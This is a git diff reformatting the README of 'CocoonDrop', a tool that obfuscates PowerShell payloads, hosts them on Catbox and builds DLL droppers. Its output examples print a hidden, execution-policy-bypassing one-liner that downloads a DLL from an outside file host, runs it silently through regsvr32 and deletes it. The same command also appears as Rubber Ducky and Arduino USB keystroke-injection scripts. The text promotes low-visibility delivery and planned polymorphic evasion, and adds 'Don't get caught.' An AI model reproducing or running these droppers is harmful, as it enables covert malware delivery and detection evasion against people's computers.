@@ -37,17 +37,27 @@ It encrypts PowerShell payloads using XOR + Base64, stages them via Catbox, opti
 
 ### 🐍 Python Dependencies
 
+```bash
 pip install pyqt5 catbox-uploader requests
+```
 
-🧪 Use Cases
-Use Case	Description
-🔐 Red Team	Payload dropper for low-visibility delivery
-🧠 CTF Creation	Make challenge stages that feel real
-🔌 HID Injection	Combine with Ducky or Beetle USB for physical access
-🔍 Adversarial Sim	Simulate malware delivery without the malware
-🛡️ EDR Testing	Safe, weird payload behaviors for defense teams
-🧰 Workflow Overview
+---
 
+## 🧪 Use Cases
+
+| Use Case          | Description                                       |
+|-------------------|---------------------------------------------------|
+| 🔐 Red Team       | Payload dropper for low-visibility delivery       |
+| 🧠 CTF Creation    | Make challenge stages that feel real              |
+| 🔌 HID Injection   | Combine with Ducky or Beetle USB for physical access |
+| 🔍 Adversarial Sim| Simulate malware delivery without the malware     |
+| 🛡️ EDR Testing     | Safe, weird payload behaviors for defense teams   |
+
+---
+
+## 🧰 Workflow Overview
+
+```
 [PowerShell Script]
         ↓
 [XOR + Base64 Encode]
@@ -67,20 +77,31 @@ Use Case	Description
 [Compile DLL → Upload to Catbox]
         ↓
 [Final PS Dropper + Ducky/Beetle Scripts (optional)]
+```
 
-🚀 Usage
+---
 
+## 🚀 Usage
+
+```bash
 git clone https://github.com/YOUR-USERNAME/cocoondrop.git
 cd cocoondrop
 python cocoondrop.py
+```
 
-🖥️ Output Examples
-🪄 Final PowerShell One-Liner
+---
 
-powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "(Invoke-WebRequest -Uri 'https://files.catbox.moe/abc123.dll' -OutFile '$env:TEMP\\dropper.dll'); Start-Process -FilePath 'regsvr32.exe' -ArgumentList '/s $env:TEMP\\dropper.dll'; Start-Sleep -s 3; Remove-Item -Force -Path '$env:TEMP\\dropper.dll'"
+## 🖥️ Output Examples
 
-🐥 Rubber Ducky Script
+### 🪄 Final PowerShell One-Liner
 
+```powershell
+powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "(Invoke-WebRequest -Uri 'https://files.catbox.moe/abc123.dll' -OutFile '$env:TEMP\dropper.dll'); Start-Process -FilePath 'regsvr32.exe' -ArgumentList '/s $env:TEMP\dropper.dll'; Start-Sleep -s 3; Remove-Item -Force -Path '$env:TEMP\dropper.dll'"
+```
+
+### 🐥 Rubber Ducky Script
+
+```ducky
 DELAY 1000
 GUI r
 DELAY 200
@@ -89,60 +110,66 @@ ENTER
 DELAY 700
 STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "(Invoke-WebRequest -Uri 'https://...dll' ..."
 ENTER
+```
 
-🪲 Beetle USB Sketch (Arduino)
+### 🪲 Beetle USB Sketch (Arduino)
 
+```cpp
 typeString("powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ");
-typeString("\"(Invoke-WebRequest -Uri 'https://files.catbox.moe/abc123.dll' -OutFile '$env:TEMP\\dropper.dll'); Start-Process -FilePath 'regsvr32.exe' -ArgumentList '/s $env:TEMP\\dropper.dll'; Start-Sleep -s 3; Remove-Item -Force -Path '$env:TEMP\\dropper.dll'\"");
+typeString(""(Invoke-WebRequest -Uri 'https://files.catbox.moe/abc123.dll' -OutFile '$env:TEMP\dropper.dll'); Start-Process -FilePath 'regsvr32.exe' -ArgumentList '/s $env:TEMP\dropper.dll'; Start-Sleep -s 3; Remove-Item -Force -Path '$env:TEMP\dropper.dll'"");
+```
 
-✍️ GUI Walkthrough
+---
 
-    💬 Paste your PowerShell payload
+## ✍️ GUI Walkthrough
 
-    🔑 Choose or generate a key
+1. 💬 Paste your PowerShell payload  
+2. 🔑 Choose or generate a key  
+3. 🧪 Encrypt & upload payload  
+4. 📤 Auto-generate and upload staging script  
+5. 🔗 CocoonDrop silently shortens it via goolnk RapidAPI  
+6. 🧙 Generate DLL from the embedded payload  
+7. 📎 Get the final execution script  
+8. 🎯 Choose HID output (Ducky / Beetle) — optional  
 
-    🧪 Encrypt & upload payload
+---
 
-    📤 Auto-generate and upload staging script
-
-    🔗 CocoonDrop silently shortens it via goolnk RapidAPI
-
-    🧙 Generate DLL from the embedded payload
-
-    📎 Get the final execution script
-
-    🎯 Choose HID output (Ducky / Beetle) — optional
-
-🔐 Legal & Ethics Notice
+## 🔐 Legal & Ethics Notice
 
 CocoonDrop is strictly for:
 
-    🔐 Ethical red teaming
+- 🔐 Ethical red teaming  
+- 🧠 CTF creation  
+- 🧪 Adversarial simulations  
+- 🛡️ Blue team EDR testing  
 
-    🧠 CTF creation
-
-    🧪 Adversarial simulations
-
-    🛡️ Blue team EDR testing
-
-You are responsible for your actions.
+**You are responsible for your actions.**  
 Don't be evil. Don't be stupid. Don’t get caught.
-🧬 Why "CocoonDrop"?
 
-Like a cocoon, the payload is hidden, dormant, ready to execute only when triggered.
-It doesn’t crawl. It waits.
+---
+
+## 🧬 Why "CocoonDrop"?
+
+Like a cocoon, the payload is hidden, dormant, ready to execute only when triggered.  
+It doesn’t crawl. It waits.  
 It doesn’t fight. It deploys.
 
-👨‍🔧 Credits
+---
 
-beigeworm for the inspo
+## 👨‍🔧 Credits
 
-me for reverse engineering his brilliance and turning it into an obfuscator
+- **beigeworm** for the inspo  
+- **me** for reverse engineering his brilliance and turning it into an obfuscator  
 
-TODO:
-use more encryption than xor
-and polymorphic encryption with variable layers
+---
 
-🪓 License
+## 🛠️ TODO
+
+- Use more encryption than XOR  
+- Add polymorphic encryption with variable layers  
+
+---
+
+## 🪓 License
 
 MIT. Just don’t use it for malware and don’t sue me.
